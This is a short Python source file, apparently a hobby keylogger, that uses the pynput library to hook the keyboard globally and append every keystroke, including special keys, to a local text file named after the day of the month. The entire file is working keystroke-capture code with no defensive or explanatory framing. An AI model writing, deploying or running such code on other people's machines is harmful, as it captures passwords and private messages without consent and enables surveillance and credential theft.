from pynput import keyboard
import time

local_time = time.localtime()

day = local_time.tm_mday


def keyPressed(key):
    with open(f"{day}_keylog.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            logKey.write(f"\n KEY: {key}\n")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
